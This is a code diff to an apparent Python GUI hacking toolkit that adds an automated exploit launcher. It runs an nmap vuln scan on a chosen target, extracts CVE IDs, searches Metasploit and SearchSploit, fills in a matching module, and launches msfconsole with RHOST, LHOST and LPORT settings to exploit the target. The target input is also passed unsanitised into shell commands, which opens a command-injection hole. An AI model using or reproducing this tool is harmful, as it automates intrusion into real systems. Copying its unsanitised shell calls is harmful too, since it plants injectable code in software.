@@ -384,16 +384,68 @@ def add_rule():
     fw_output.insert(END, f"Rule added: iptables {cmd}\n")
 Button(tab13, text="Add Rule", command=add_rule).pack()
 
-# === Tab 14: Exploit Launcher ===
+# === Exploit Launcher (Metasploit + CVE Scanner + SearchSploit) ===
 tab14, msf_output = create_tab("Exploit Launcher")
-Label(tab14, text="Exploit Path:", bg="#1e1e2e", fg="#0ff").pack()
+
+Label(tab14, text="Target IP for CVE Scan:", bg="#1e1e2e", fg="#0ff").pack()
+cve_target = Entry(tab14); cve_target.pack()
+
+def scan_for_cves():
+    target = cve_target.get()
+    if not target:
+        msf_output.insert(END, "[!] Please enter a target IP.\n")
+        return
+
+    msf_output.insert(END, f"[•] Scanning {target} for vulnerabilities...\n")
+    result = subprocess.getoutput(f"nmap -sV --script vuln {target}")
+    msf_output.insert(END, result + "\n")
+
+    import re
+    cves = re.findall(r'CVE-\d{4}-\d{4,7}', result)
+    found = list(set(cves))
+    if not found:
+        msf_output.insert(END, "[!] No CVEs found.\n")
+        return
+
+    msf_output.insert(END, f"[✓] Found CVEs: {', '.join(found)}\n")
+
+    for cve in found:
+        msf_output.insert(END, f"[•] Searching Metasploit for {cve}...\n")
+        search_result = subprocess.getoutput(f"msfconsole -q -x \"search {cve}; exit\"")
+        lines = search_result.splitlines()
+        matched = False
+        for line in lines:
+            if "exploit/" in line:
+                parts = line.strip().split()
+                path = next((p for p in parts if p.startswith("exploit/")), None)
+                if path:
+                    msf_output.insert(END, f"[✓] Matched Metasploit Module: {path}\n")
+                    msf_exploit.delete(0, END)
+                    msf_exploit.insert(0, path)
+                    matched = True
+                    break
+
+        msf_output.insert(END, f"[•] Searching Exploit-DB via SearchSploit for {cve}...\n")
+        ss_result = subprocess.getoutput(f"searchsploit {cve}")
+        if "No Results" not in ss_result:
+            msf_output.insert(END, f"[✓] SearchSploit Results:\n{ss_result}\n")
+        else:
+            msf_output.insert(END, f"[x] No results from SearchSploit for {cve}\n")
+
+Button(tab14, text="Scan for CVEs", command=lambda: threading.Thread(target=scan_for_cves).start()).pack(pady=5)
+
+Label(tab14, text="Exploit Path (e.g. exploit/windows/smb/ms17_010_eternalblue):", bg="#1e1e2e", fg="#0ff").pack()
 msf_exploit = Entry(tab14); msf_exploit.pack()
+
 Label(tab14, text="RHOST:", bg="#1e1e2e", fg="#0ff").pack()
 msf_rhost = Entry(tab14); msf_rhost.pack()
+
 Label(tab14, text="LHOST:", bg="#1e1e2e", fg="#0ff").pack()
 msf_lhost = Entry(tab14); msf_lhost.pack()
+
 Label(tab14, text="LPORT:", bg="#1e1e2e", fg="#0ff").pack()
 msf_lport = Entry(tab14); msf_lport.insert(0, "4444"); msf_lport.pack()
+
 def launch_msf():
     script = f"""
 use {msf_exploit.get()}
@@ -402,10 +454,12 @@ set LHOST {msf_lhost.get()}
 set LPORT {msf_lport.get()}
 exploit
 """
-    with open("msf.rc", "w") as f: f.write(script)
+    with open("msf.rc", "w") as f:
+        f.write(script)
     msf_output.insert(END, "Launching exploit in terminal...\n")
     os.system("x-terminal-emulator -e 'msfconsole -r msf.rc'")
-Button(tab14, text="Launch Exploit", command=lambda: threading.Thread(target=launch_msf).start()).pack()
+
+Button(tab14, text="Launch Exploit", command=lambda: threading.Thread(target=launch_msf).start()).pack(pady=5)
 
 # === Tab 15: Log Export ===
 tab15, log_output = create_tab("Export Logs")
